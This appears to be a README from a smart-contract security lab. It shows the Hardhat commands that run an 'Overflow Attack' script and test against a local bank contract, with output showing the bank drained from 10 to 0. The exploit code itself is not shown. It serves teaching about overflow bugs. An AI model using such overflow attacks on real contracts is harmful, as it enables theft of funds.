# Overflow Attack

## Script

```bash
$ cd overflow
$ npx hardhat compile
$ npx hardhat run scripts/OverflowAttack.js --network localhost
$ npx hardhat test test/OverflowAttack.js

  Overflow Attack
Bank balance before attack: 10.0
Attacker balance before attack: 9989.998708259262918561
-------------------------------
Bank balance after attack: 0.0
Attacker balance after attack: 9999.998604234268539613
    ✔ should allow overflow attack to drain funds from the bank


  1 passing (480ms)
```